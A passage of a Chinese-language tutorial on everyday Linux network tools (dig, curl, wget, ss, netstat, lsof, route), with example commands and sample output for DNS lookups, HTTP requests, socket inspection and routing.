Non-authoritative answer:
Name:   qq.com
Address: 183.3.226.35
Name:   qq.com
Address: 203.205.254.157
Name:   qq.com
Address: 61.129.7.47
Name:   qq.com
Address: 123.151.137.18
------------
    QUESTIONS:
        qq.com, type = AAAA, class = IN
    ANSWERS:
    AUTHORITY RECORDS:
    -&gt;  qq.com
        origin = ns1.qq.com
        mail addr = webmaster.qq.com
        serial = 1330914143
        refresh = 3600
        retry = 300
        expire = 86400
        minimum = 300
        ttl = 296
    ADDITIONAL RECORDS:
------------
```

### dig

***dig***（Domain Information Groper) 执行DNS查找。默认情况下，dig查询通过 resolver ( `/etc/resolv.conf` ) 中列出的DNS地址，除非指定特定的name server。

### 语法

```bash
dig @server name type
```

### 解析IP地址

`dig` 通常不带参数地用于获取提供的DNS名称的IP地址。默认使用系统提供的DNS服务器用于DNS解析。

```bash
dig www.qq.com

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; www.qq.com
;; global options: &#43;cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 40004
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;www.qq.com.                    IN      A

;; ANSWER SECTION:
www.qq.com.             132     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.76
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.65

;; Query time: 11 msec
;; SERVER: 183.60.83.19#53(183.60.83.19)
;; WHEN: Tue Jun 22 21:39:33 CST 2021
;; MSG SIZE  rcvd: 108
```

**dig命令输出包括以下部分**：

- `HEADER`：显示dig命令的版本号、dig命令使用的全局选项，以及一些附加的Header信息。
- `QUESTION SECTION`：显示dig像DNSserver发出的请求。即你请求的域名。这里使用dig命令获取`qq.com`使用的默认类型（A记录）
- `ANSWER SECTION`：显示从DNS接收到的应答。将显示`qq.com` 的A记录
- `ADDITIONAL SECTION`：显示`ADDITIONAL SECTION` 中列出的DNS服务器的ip地址。
- 底部的Stats部分显示一些dig命令统计信息，包括执行此查询所用的时间

### 仅显示应答部分

在大多数情况下，我们只需要查看dig的 `ANSWER SECTION`。可以仅打印该部分。

- `&#43;nocomments` 不显示注释行
- `&#43;noauthority`  不显示`authority`部分
- `&#43;noadditional`   不显示 `additional` 部分
- `&#43;nostats`  不显示统计信息 `stats`
- `&#43;noanswer` 关掉`ANSWER`  部分，这里一般为想要的结果

```bash
dig www.qq.com \
    &#43;nocomments \
    &#43;noquestion \
    &#43;noauthority \
    &#43;noadditional \
    &#43;nostats

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; www.qq.com &#43;nocomments &#43;noquestion &#43;noauthority &#43;noadditional &#43;nostats
;; global options: &#43;cmd
www.qq.com.             180     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
ins-r23tsuuf.ias.tencent-cloud.net. 31 IN A     109.244.236.65
ins-r23tsuuf.ias.tencent-cloud.net. 31 IN A     109.244.236.76
```

也可以使用 `&#43;noal` 禁用所有不需要的部分，当然也会关掉 `answer` ，然后`&#43;answer` 只显示 `answer`部分，这样看起来简洁些。

```bash
dig www.qq.com \
    &#43;noall \
    &#43;answer
```

### 查询MX记录

将MX作为参数，可以查询mx记录，可以使用 `-t` 增加类型 

```bash
dig qq.com  MX &#43;noall &#43;answer

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com MX &#43;noall &#43;answer
;; global options: &#43;cmd
qq.com.                 4969    IN      MX      10 mx3.qq.com.
qq.com.                 4969    IN      MX      20 mx2.qq.com.
qq.com.                 4969    IN      MX      30 mx1.qq.com.
```

### 查询NS记录

```bash
dig qq.com NS &#43;noall &#43;answer
```

### 查询所有记录

查看所有记录类型（A、MX、NS等），可以使用ANY作为类型。

```bash
dig qq.com ANY &#43;noall &#43;answer

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com ANY &#43;noall &#43;answer
;; global options: &#43;cmd
qq.com.                 83      IN      A       183.3.226.35
qq.com.                 83      IN      A       203.205.254.157
qq.com.                 83      IN      A       123.151.137.18
qq.com.                 83      IN      A       61.129.7.47
```

### 仅查看记录的IP

有些场景下，仅需要域名的ip地址（即a记录），可以使用 ` &#43;short` 选项。

```bash
dig qq.com &#43;short
123.151.137.18
203.205.254.157
183.3.226.35
61.129.7.47
```

` &#43;short`  也可指定类型

```bash
dig qq.com a &#43;short

111.30.144.71
112.53.26.232

dig qq.com mx &#43;short

10 mx3.qq.com.
20 mx2.qq.com.
30 mx1.qq.com.
```

### 反向查找

可以使用`dig-x` 进行ip地址反向查找DNS，场景：如果只有一个外部ip地址，并且希望知道属于它的网站时。当然过了CDN的域名，只会显示对应CNAME

```bash
dig -x 203.205.254.157 &#43;short 
```

### 使用指定DNS来进行查询

默认情况下，dig 使用 `/etc/resolv.conf` 文件中定义的DNS。如果要使用其他DNS执行查询，使用 `@dnsserver`。

```bash
dig @8.8.8.8 www.qq.com &#43;short

ins-r23tsuuf.ias.tencent-cloud.net.
109.244.236.76
109.244.236.65
```

### 批量查询

进行批量查询时可以不用通过shell循环查询了，dig提供了批量查询的功能。使用`dig -f` 从文件内进行批量DNS查询。

```bash
echo www.qq.com &gt; dns.txt
echo www.baidu.com &gt;&gt; dns.txt

dig -f dns.txt &#43;noall &#43;answer

www.baidu.com.          678     IN      CNAME   www.a.shifen.com.
www.a.shifen.com.       106     IN      A       14.215.177.39
www.a.shifen.com.       106     IN      A       14.215.177.38
www.qq.com.             60      IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.65
ins-r23tsuuf.ias.tencent-cloud.net. 60 IN A     109.244.236.76
```

也可以在命令行直接根多个域名即可，这样查询结果相比于shell循环查询会简洁很多。

```bash
dig qq.com mx &#43;noall &#43;answer baidu.org ns &#43;noall &#43;answer

; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; qq.com mx &#43;noall &#43;answer baidu.org ns &#43;noall &#43;answer
;; global options: &#43;cmd
qq.com.                 4223    IN      MX      10 mx3.qq.com.
qq.com.                 4223    IN      MX      20 mx2.qq.com.
qq.com.                 4223    IN      MX      30 mx1.qq.com.
baidu.org.              300     IN      NS      ns4.brandshelter.net.
baidu.org.              300     IN      NS      ns3.brandshelter.info.
baidu.org.              300     IN      NS      ns2.brandshelter.de.
baidu.org.              300     IN      NS      ns5.brandshelter.us.
baidu.org.              300     IN      NS      ns1.brandshelter.com.
```

### 设置dig默认选项

如别名 `alias` 一样，在查询中不想输入过多的 `&#43;noall &#43;answer` 之类，可以在 `$HOME/.digrc ` 设置dig 的默认参数，这样只需和平时一样使用 `dig domain` 即可。

```bash
cat &lt;&lt;EOF &gt;${HOME}/.digrc&#43;noall &#43;answerEOFdig www.qq.comwww.qq.com.             247     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.ins-r23tsuuf.ias.tencent-cloud.net. 67 IN A     109.244.236.76ins-r23tsuuf.ias.tencent-cloud.net. 67 IN A     109.244.236.6
```


## curl

***curl*** 是Linux命令行工具，可以使用任何可支持的协议（如HTTP、FTP、IMAP、POP3、SCP、SFTP、SMTP、TFTP、TELNET、LDAP或FILE）在服务器之间传输数据。

在Linux下，curl是由 `libcurl` 提供驱动封装的cli客户端，在 `libcurl` 驱动下，curl可以一次传输多个文件。而PHP中的cURL函数，也是基于libcurl驱动的。

&gt; **各系统下的安装**
&gt;
&gt; - Ubuntu/Debian:  `curl`； `apt install curl`
&gt; - CentOS/Fedora: `curl`  ； `yum install -y curl`
&gt; - Apline：`curl` | `wget` ； `apk add --no-cache curl`

###  cURL常用参数

|                   参数                   | 说明                                                     |
| :--------------------------------------: | :------------------------------------------------------- |
|                    -i                    | 默认隐藏响应头，此选项打印响应头与                       |
|                -I/--head                 | 仅显示响应头                                             |
|                    -o                    | 将相应内容保存指定路径下                                 |
|                    -O                    | 将相应内容保存在当前工作目录下                           |
|                    -C                    | 断点续传，在 crtl &#43; c终端后，可以从中断后部分开始        |
|                    -v                    | 显示请求头与响应头                                       |
|                    -x                    | 使用代理                                                 |
|                    -X                    | 指定请求方法，POST GET PUT DELETE等                      |
|                    -d                    | 如GET/POST/PUT/DELETE 需要传的表单参数，如JSON格式       |
|           -u username:password           | 当使用ftp有用户名可以使用-u，ftp允许匿名用户访问可以忽略 |
|            –-limit-rate 2000B            | 限速                                                     |
|         -T/--upload-file \&lt;file&gt;         | 上传一个文件                                             |
|       -c/--cookie-jar \&lt;file name&gt;       | 将cookie下载到文件内                                     |
|              -k/--insecure               | 允许执行不安全的ssl连接，即调过SSL检测                   |
| `--header &#39;Host: targetapplication.com&#39;` | 使用请求头                                               |
|              -L/--location               | 接受服务端redirect的请求                                 |
|                    -F                    | 上传二进制文件                                           |

### 限制下载速率

```bash
curl --limit-rate 100K http://yourdomain.com/yourfile.tar.gz -O
```

### 使用代理访问

```bash
curl --proxy yourproxy:port https://yoururl.com
```

### 限速访问

```bash
curl www.baidu.com  --limit-rate 1k
```

### 存储cookie和使用cookie

```
$ curl --cookie-jar cnncookies.txt https://www.baidu.com/index.html -O -s -v
* About to connect() to www.baidu.com port 443 (#0)
*   Trying 14.215.177.39...
* Connected to www.baidu.com (14.215.177.39) port 443 (#0)
* Initializing NSS with certpath: sql:/etc/pki/nssdb
*   CAfile: /etc/pki/tls/certs/ca-bundle.crt
  CApath: none
* SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
* Server certificate:
*       subject: CN=baidu.com,O=&#34;Beijing Baidu Netcom Science Technology Co., Ltd&#34;,OU=service operation department,L=beijing,ST=beijing,C=CN
*       start date: Apr 02 07:04:58 2020 GMT
*       expire date: Jul 26 05:31:02 2021 GMT
*       common name: baidu.com
*       issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE
&gt; GET /index.html HTTP/1.1
&gt; User-Agent: curl/7.29.0
&gt; Host: www.baidu.com
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Accept-Ranges: bytes
&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform
&lt; Connection: keep-alive
&lt; Content-Length: 2443
&lt; Content-Type: text/html
&lt; Date: Wed, 26 May 2021 12:14:41 GMT
&lt; Etag: &#34;58860402-98b&#34;
&lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT
&lt; Pragma: no-cache
&lt; Server: bfe/1.0.8.18
* Added cookie BDORZ=&#34;27315&#34; for domain baidu.com, path /, expire 1622117681
&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/
&lt; 
{ [data not shown]
* Connection #0 to host www.baidu.com left intact
```

```
# Netscape HTTP Cookie File# http://curl.haxx.se/docs/http-cookies.html# This file was generated by libcurl! Edit at your own risk..baidu.com      TRUE    /       FALSE   1622117681      BDORZ   27315
```


```
$ curl --cookie cnncookies.txt https://www.baidu.com -s -v -o /dev/null
* About to connect() to www.baidu.com port 443 (#0)
*   Trying 14.215.177.39...
* Connected to www.baidu.com (14.215.177.39) port 443 (#0)
* Initializing NSS with certpath: sql:/etc/pki/nssdb
*   CAfile: /etc/pki/tls/certs/ca-bundle.crt
  CApath: none
* SSL connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
* Server certificate:
*       subject: CN=baidu.com,O=&#34;Beijing Baidu Netcom Science Technology Co., Ltd&#34;,OU=service operation department,L=beijing,ST=beijing,C=CN
*       start date: Apr 02 07:04:58 2020 GMT
*       expire date: Jul 26 05:31:02 2021 GMT
*       common name: baidu.com
*       issuer: CN=GlobalSign Organization Validation CA - SHA256 - G2,O=GlobalSign nv-sa,C=BE
&gt; GET / HTTP/1.1
&gt; User-Agent: curl/7.29.0
&gt; Host: www.baidu.com
&gt; Accept: */*
&gt; Cookie: BDORZ=27315
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Accept-Ranges: bytes
&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform
&lt; Connection: keep-alive
&lt; Content-Length: 2443
&lt; Content-Type: text/html
&lt; Date: Wed, 26 May 2021 12:23:27 GMT
&lt; Etag: &#34;58860402-98b&#34;
&lt; Last-Modified: Mon, 23 Jan 2017 13:24:18 GMT
&lt; Pragma: no-cache
&lt; Server: bfe/1.0.8.18
* Replaced cookie BDORZ=&#34;27315&#34; for domain baidu.com, path /, expire 1622118207
&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/  # 这里可以看到设置的cookie
&lt; 
{ [data not shown]
* Connection #0 to host www.baidu.com left intact
```

### 使用代理

```bash
curl -x socks5://127.0.0.1:10808 https://www.google.com
```

### 使用application/x-www-form-urlencoded表单类型

这里使用的为`application/x-www-form-urlencoded`

```bash
curl -d &#34;option=value&amp;something=anothervalue&#34; -X POST https://{hostname}/
```

### 使用json格式作为body

```bash
curl  -H &#34;Content-Type: application/json&#34; -X POST https://host.com/ \
-d &#39;  {   &#34;option&#34;: &#34;value&#34;,    &#34;something&#34;: &#34;anothervalue&#34; }&#39;
```

### 使用curl 上传文件

```bash
curl {host}/api/v1/upimg -F &#34;file=@/Users/fungleo/Downloads/401.png&#34; \
-H &#34;token: 222&#34; -v
```

也可以指定`MIME`类型。如：

```bash
curl -F &#39;file=@photo.png;type=image/png&#39; https://{host}/api/v1/upimg
```

### curl输出的格式变量

curl -w参数提供了一些格式变量，可以达到紧紧获取某些数据

### 仅获取http状态码

```bash
curl -w %{http_code} www.baidu.com -o /dev/null -s
```

### 获取整个请求的时间

获取整个请求的耗时，单位秒，显示单位 毫秒

```bash
curl -w %{time_total} www.baidu.com -o /dev/null -s
```

### 获取域名解析时间

```bash
curl -w %{time_namelookup} www.baidu.com -o /dev/null -s
```

### 获取TCP连接耗时

```bash
curl -w %{time_connect} www.baidu.com -o /dev/null -s
```

### 获取SSL/SSH握手到远程主机耗时

```bash
curl -w %{time_appconnect} https://www.baidu.com -o /dev/null -s -v
```

### 获取所有重定向的耗时

这里是从查找、连接、传输整个事务的完成到开始传送数据之前的耗时

```bash
curl -w %{time_redirect} www.baidu.com -o /dev/null -s
```

### 获得下载的总字节数

这里是http相应的body长度，而不是加上头部的大小

```bash
curl -w %{size_download} www.baidu.com -o /dev/null -s
```

```
$ curl -w %{size_download} www.baidu.com -o /dev/null -s
2381
```

### 获得请求体送字节数

```bash
curl -w %{size_request} www.baidu.com -o /dev/null -s
```

### 获得传输中的连接数

```bash
curl -w %{num_connects} www.baidu.com -o /dev/null -s
```

### 获得重定向次数

```bash
curl -w %{num_redirects} www.360buy.com -o /dev/null -s  -L
```

### 获得SSL验证结果

0 表示是成功的

```bash
curl -w %{ssl_verify_result} https://www.baidu.com -o /dev/null -s -L
```

### 获得重定向的地址

当没有指定`-L`时，会返回被重定向后的地址

```bash
curl -w %{redirect_url} https://www.360buy.com -o /dev/null -s 
```

### 获得上传和下载速度

```bash
curl -w %{speed_download} https://www.360buy.com -o /dev/null -s
curl -w %{speed_upload} https://www.360buy.com -o /dev/null -s
```

### 根据自己需要拼接特定格式

```bash
curl -w &#34;总共请求时长：%{time_total}\n总跳转次数：%{num_redirects}\n&#34; \
www.360buy.com -o /dev/null -s

总共请求时长：1.338总跳转次数：3
```

## wget

***wget*** 用于从web下载文件的命令行程序。wget，可以使用 `HTTP`、`HTTPS`和 `FTP` 协议下载文件。wget还允许下载多个文件、断点续传、限速、递归下载、后台下载、镜像网站等等。

&gt; **各系统下的安装**
&gt;
&gt; - Ubuntu/Debian:  `wget` ； `apt install wget`
&gt; - CentOS/Fedora: `wget`  ； `yum install -y wget`
&gt; - Apline： `wget` ；  `apk add --no-cache wget`


### 简单使用

使用wget最简单的方法是为它提供通过HTTP下载的文件的位置。如，下载文件。

```bash
wget http://website.com/files/file.zip
```

该操作会将文件下载到工作目录中。

### 下载文件并保存为指定名称

```bash
wget –O [file_name] [URL]
```

### 将文件下载到指定目录

默认情况下，wget下载的文件保存在用户所在工作目录中。使用 `–P` 可以将文件保存到指定路径。

```bash
wget –P [wanted_directory] [URL]
```

### 设置下载速度

在下载时可以设置下载时最大使用带宽，这样就不会使用主机全部的可用带宽。下载速度以 `k` 和 `m` 定义单位。

```bash
wget --limit-rate [wanted_speed] [URL]

wget --limit-rate 1m http://us.download.nvidia.com/tesla/396.37/nvidia-diag-driver-local-repo-ubuntu1710-396.37_1.0-1_amd64.deb 
```

### 断点续传

如果在下载时取消，wget提供了可以在中断前停止的地方继续下载。当下载文件时连接丢失时，这个非常有用。

```bash
wget –c [URL]
```

### 下载多个文件

wget也提供了下载多个文件的方法：

方法1：将需要下载的文件地址保存在文件中 使用 `-i` 指定文件，每个URL 单独占一行

```bash
wget –i [file_name]
```

### 下载网页（网站镜像）

使用 `–m` 下载URL中包含的所有连接，结果会保存为一个文件夹

```bash
wget –m [URL]
```

### FTP下载

wget也可以下载FTP文件，当需要认证时，可以指定FTP的用户名和密码，然后接FTP地址：

```bash
wget --ftp-user=[ftp_username] --ftp-password=[ftp_password] ftp://...
```

### 后台下载

当下载文件很大时，wget也支持后台下载文件，在网络不稳定命令行断开时很实用。

```bash
wget –b [URL]
```

可以使用命令 `tail –f wget –log ` 来检查下载状态

### 中断重试次数

当网络中断后，wget也支持设置在网络中断后尝试下载文件的次数：

```bash
wget --tries=[number_of_tries] [URL]
```

### 忽略证书验证

默认情况下，wget会验证服务端SSL/TLS证书是否有效。如果识别到无效的证书，它将拒绝下载。当在访问自签名证书时，可以使用`--no-check-certificate` 忽略验证

```bash
wget --no-check-certificate [URL]
```

### 自定义User-Agent

当服务端阻止了特定的 `User-Agent ` 时，可以进行自定义 `User-Agent` 设置。

```bash
wget --user-agent=”User Agent Here” “[URL]”
```

### 实用技巧-下载内容到标准输出stdout

如在下载一个tar包时，一般都是wget 后 在tar 解压到对应目录，可以使用 `-O -` 将其下载到标准输出，`-q` 静默方式，通过管道直接解压到对应的路径下。

```bash
wget -q -O - &#34;http://wordpress.org/latest.tar.gz&#34; | tar -xzf - -C /var/www
```

## ss

***ss*** (socket statistics) 命令行工具，用于在Linux系统上显示与网络套接字相关的信息。

&gt;**各系统下的安装**
&gt;
&gt;- **ss**
&gt;- Ubuntu/Debian:  `iproute2`   ；`apt install iproute2` 
&gt;- CentOS/Fedora: `iproute`  ；`yum install -y iproute` 
&gt;- Apline：`iproute` ；`apk add --no-cache iproute`
&gt;

### 查看所有连接

没有任何选项的ss命令只列出所有连接。

### 查看Listening 与 Non-listening Ports

```bash
ss -a
```

### 查看监听 套接字列表

这里列出所有监听套接字，不关其是服务监听还是客户端请求占用

```bash
ss -l
```

### 查看所有TCP连接

这里只所有的tcp连接， 包含客户端与服务端

```bash
ss -t
```

### 查看所有监听类型的tcp连接

```bash
ss -lt
```

### 查看所有udp连接

```bash
ss -ua
```

### 查看监听类型的UDP连接

```bash
ss -lu
```

### 显示socket的pid进程id

```bash
ss -p
```

### 显示连接摘要信息

```bash
ss -s
```

### 显示ipv6或ipv4 连接

```bash
ss -4
ss -6
```

### 筛选连接

语法

```bash
ss [ OPTIONS ] [ STATE-FILTER ] [ ADDRESS-FILTER ]
```

ss命令还提供了筛选方法，过滤套接字端口或地址。例如，要显示具有ssh服务的源端口与目标端口（即监听与客户端连接）。

```
 ss -at &#39;( dport = :22 or sport = :22 )&#39;
```

也可以通过服务名称进行过滤

```bash
ss -at &#39;( dport = :ssh or sport = :ssh )&#39;
```

仅显示所有处于 `established` 状态的Ipv4 tcp套接字。

```bash
ss -t4 state established -n

Recv-Q Send-Q   Local Address:Port    Peer Address:Port   
0      0        172.16.0.2:22         61.50.248.5:22005   
0      0        172.16.0.2:42930      169.254.0.55:5574    
0      0        172.16.0.2:22         61.50.248.5:22008   
0      0        172.16.0.2:22         61.50.248.5:22003   
0      0        172.16.0.2:40652      94.130.12.30:443     
0      36       172.16.0.2:22         61.50.248.5:22012   
0      0        172.16.0.2:22         61.50.248.5:22004   
```

列出状态为time wait的套接字

```bash
ss -t4 state time-wait -n
```

这里状态可以为下面的任意一种

&gt;- established
&gt;- syn-sent
&gt;- syn-recv
&gt;- fin-wait-1
&gt;- fin-wait-2
&gt;- time-wait
&gt;- closed
&gt;- close-wait
&gt;- last-ack
&gt;- closing
&gt;- all  上面所有状态
&gt;- connected  除listen和closed之外的所有状态
&gt;- synchronized  除syn-sent之外的所有连接状态
&gt;- 显示状态，这些被维护为mini sockets，即 `time-wait ` 与 `syn-recv`
&gt;- big 与bucket选项相反

过滤地址

```bash
ss -nt dst 74.125.236.178
```

还可以过滤网段

```bash
ss -nt dst 74.125.236.178/16
```

ip和端口的组合

```bash
ss -nt dst 74.125.236.178:80
```

源地址为127.0.0.1，且源端口大于5000

```bash
ss -nt src 127.0.0.1 sport gt :5000
```

源端口为25的smtp套接字

```bash
ss -ntlp sport eq :smtp
```

端口号大于25

```bash
ss -nt sport gt :1024
```

远程端口小于100的套接字

```bash
ss -nt dport \&lt; :100
```

连接到远程80端口的

```bash
ss -nt state connected dport = :80
```

### 不解析主机名

可以通过 `-n` 选项阻止ss 将ip解析为主机名，来达到更快地获得输出，但这也无法进行到端口号的解析。

```bash
ss -at &#39;( dport = :22 or sport = :22 )&#39;

State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port                
LISTEN     0      128             *:ssh                     *:*                    
ESTAB      0      0          172.16.0.2:ssh           111.206.214.55:49374                
ESTAB      0      0          172.16.0.2:ssh           61.50.248.5:optohost005          
ESTAB      0      36         172.16.0.2:ssh           61.50.248.5:22008                
ESTAB      0      0          172.16.0.2:ssh           61.50.248.5:optohost003          
ESTAB      0      0          172.16.0.2:ssh           61.50.248.5:optohost004          
LISTEN     0      128            [::]:ssh                 [::]:*                    


ss -at &#39;( dport = :22 or sport = :22 )&#39; -n
State      Recv-Q Send-Q   Local Address:Port         Peer Address:Port              
LISTEN     0      128           *:22                    *:*                  
ESTAB      0      0        172.16.0.2:22              111.206.214.55:49374              
ESTAB      0      0        172.16.0.2:22              61.50.248.5:22005              
ESTAB      0      36       172.16.0.2:22              61.50.248.5:22008              
ESTAB      0      0        172.16.0.2:22              61.50.248.5:22003              
ESTAB      0      0        172.16.0.2:22              61.50.248.5:22004              
LISTEN     0      128            [::]:22                    [::]:*      
```

### 仅显示监听套接字

```bash
ss -ltn
```

要列出所有侦听的udp连接，请将t替换为u

```bash
ss -lun
```

### 显示时间信息

可以使用 `-o` 选项，来获得每个连接的时间信息。通过timer得知

```bash
ss -tn -o

State      Recv-Q Send-Q     Local Address:Port    Peer Address:Port              
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22005   timer:(keepalive,40min,0)
ESTAB      0      0          172.16.0.2:42930      169.254.0.55:5574               
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22008   timer:(keepalive,64min,0)
ESTAB      0      0          172.16.0.2:44900      169.254.0.55:80     timer:(keepalive,13sec,0)
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22003   timer:(keepalive,40min,0)
ESTAB      0      36         172.16.0.2:22         61.50.248.5:22012   timer:(on,347ms,0)
ESTAB      0      0          172.16.0.2:39316      94.130.12.30:443    timer:(keepalive,50sec,0)
ESTAB      0      0          172.16.0.2:22         61.50.248.5:22004   timer:(keepalive,40min,0)
```

### netstat

***netstat*** (network statistics) 命令行工具，用于监视传入和传出的网络连接，以及查看路由表、接口统计等。netstat在所有类似Unix的操作系统上都可用，在Windows操作系统上也可用，是最基本的网络服务调试工具。

不过，现在`netstat` 命令早已被弃用，取而代之的是 `iproute` 套件中的 `ss`。ss 比起 `netstat`，`ss` 能够显示有关网络连接的详细信息，并且速度更快。`netstat` 从 `/proc` 文件收集信息，当有大量连接要打印时，`netstat` 效率很低。而`ss` 是直接从内核空间获取信息。并且`ss`命令在使用起来与`netstat `非常相似，用户几乎可以无缝切换。

&gt;**各系统下的安装**
&gt;
&gt;- **ss**
&gt;- Ubuntu/Debian:  `iproute2`   ；`apt install iproute2` 
&gt;- CentOS/Fedora: `iproute`  ；`yum install -y iproute` 
&gt;- Apline：`iproute` ；`apk add --no-cache iproute`
&gt;
&gt;- **netstat**
&gt;- Ubuntu/Debian:  `net-tools`   ；`apt install net-tools` 
&gt;- CentOS/Fedora: `net-tools`  ；`yum install -y net-tools` 
&gt;- Apline：`net-tools` ；`apk add --no-cache net-tools`


- 列出所有tcp与udp的连接的所有端口 `netstat -a`
- 仅列出tcp (**Transmission Control Protocol**)  端口的连接 `netstat -at`
- 仅列出udp (**User Datagram Protocol** )   端口的连接 `netstat -au`
- 列出所有活动监听端口连接 `netstat -l`
- 列出TCP监听端口 `netstat -lt`
- 列出udp监听端口 `netstat -lu`
- 列出unix socket 监听端口 `netstat -lx`
- 显示统计信息 `netstat -s`
- 显示tcp的统计信息 `netstat -st`
- 显示udp的统计信息 `netstat -su`
- 显示服务名与PID号 `netstat -tp`
- 显示混杂模式，类似`watch` 每5s 刷新 `netstat -ac 5 | grep tcp`
- 显示内核路由表，类似` route -n` 命令；`netstat -r`
- 显示网络接口数据包事务，包括传输和接收MTU大小的数据包。 `netstat -i`
- 显示内核接口表，类似 `ifconfig` 命令。 `netstat -ie`
- 显示IPv4和IPv6的广播信息。`netstat -g`
- 混杂模式，间隔时间打印netstat命令的信息 `netstat -c [second] -ltnp`
- 显示原始网络信息统计 `netstat --statistics --raw`



## lsof 

***lsof*** (LiSt Open Files)，主要用来找出哪个进程打开了哪些文件。众所周知，Linux是一个基于文件的操作系统（管道、套接字、目录、设备等）。使用lsof也可以排查一些网络问题。如未关闭的文件不能被移动或删除，网络端口使用的文件等，都可以通过lsof快速定位。

&gt;**各系统下的安装**
&gt;
&gt;- Ubuntu/Debian: `lsof`  ；`apt install lsof`
&gt;- CentOS/Fedora: `lsof` ；`yum install -y lsof`
&gt;- Apline：`lsof ` ；`apk add lsof --no-cache`

### 列出所有打开的文件

不带任何参数的情况下运行lsof，可以列出所有打开的文件

```bash
lsof
```

### 列出用户进程使用的文件

lsof 可以查看特定用户进程使用的哪些文件，使用`-u`

```bash
lsof -u root
```

### 根据网络地址查找文件

```bash
lsof -i 4
```

### 按照程序名称列出所打卡的文件

这里不必使用完整的程序名，会列出所有以 name开头的进程应用使用的文件

```bash
lsof -u nginx
```

### 列出进程使用的文件

使用 `-p [pid]` k可以显示进程打开的文件，可以通过 `^` 来排除特定的PID。

```bash
lsof -p [pid]
lsof -p [^pid]
```

### 找到使用文件的进程

 使用 `-t` 餐食可以找到哪些进程使用了该文件 

```bash
lsof -t [file_name]
```

### 列出目录中所有打开的文件

`&#43;D` 餐食可以对目录的所有打开实例（包括它包含的所有文件和目录）进行搜索。

```bash
lsof &#43;D [dir]
```

### 列出网络文件

`-i` 侦听特定端口号的进程或应用程序，如检查了哪个程序进程正在使用端口80。

```bash
lsof -i:80  
```

还可以根据端口范围进程查找

```bash
lsof -i:1-1024
```

### 根据网络连接类型来查找文件

lsof还可以根据连接的类型列出文件。例如，TCP使用的文件

```bash
lsof -i tcp
```

### 拿到进程的父进程ID

`lsof -R` 可以拿到进程的父进程IP输出中列出父进程标识（PPID Parent Process IDentification）。

```bash
lsof -p [] -R
```

### 查看用户的网络连接

结合使用 `-i` 和 `-u` 命令行选项，我们可以搜索Linux用户的所有网络连接。可以按照需要检查一个被黑客攻击的系统，如我们检查用户root的所有网络活动：

```bash
lsof -a -i -u root
```

### 列出所有内存映射文件

```bash
lsof -d mem
```

## route

在Linux中，route命令用于处理IP/内核路由表。主要用于通过网络接口建立到主机/IP的静态路由。它用于显示或更新IP/内核路由表。

&gt; **各系统下的安装**
&gt;
&gt; - Ubuntu/Debian: `net-tools`  ；`apt install net-tools`
&gt; - CentOS/Fedora: `net-tools` ；`yum install -y net-tools`
&gt; - Apline：`net-tools ` ；`apk add net-tools --no-cache`

route命令不加任何参数，默认情况下将显示内核路由表条目的详细信息。当包在这个路由IP范围内发送时，通过ARP协议找到目的地的MAC地址，包将被发送到MAC地址。

当在路由条目中找不到对应的路由信息，数据包将被转发到默认网关，该网关决定该数据包的进一步路由。

route命令不加参数，会在输出时显示为主机名，这时解析会影响性能。可以使用 `-n` 选项请求不显示主机名。

```bash
route -n
```

### 添加默认网关

可以使用 `route add` 命令添加一个默认网关。

```bash
route add default gw 10.0.0.1
```

### 添加一条路由

这里添加一条，将通过10.0.0.0/24的流量由eth0设备通过 添加一条路由，如下所示。

```bash
route add -net 10.0.0.0 netmask 255.255.255.0 dev eth0
```

-net 目标网络

dev 将规则和设备关联在一起

**添加一个目标主机**

```bash
route add -host 12.123.0.10 gw 192.168.1.1 enp0s3
```

### 列出内核路由表信息

内核维护了路由缓存以更快地路由数据包。可以使用 `-C` 来打印内核的路由缓存信息。

```bash
route -Cn

Kernel IP routing cache
Source          Destination     Gateway         Flags Metric Ref    Use Iface
10.0.0.4        10.0.0.1        10.0.0.1              0      1        0 eth0
10.0.0.1        10.0.0.4        10.0.0.4        il    0      0       44 lo
10.0.0.1        10.0.0.255      10.0.0.255      ibl   0      0        7 lo
```

### 拒绝路由到特定的主机

有些场景下，可能需要拒绝数据包路由到特定的主机/网络。

```bash
route add -host 192.168.1.51 reject
```

可以看到路由已经不会路由该流量了

```bash
ping 10.0.0.2
connect: No route to host
```

如果需要拒绝整个网络可以这样

```bash
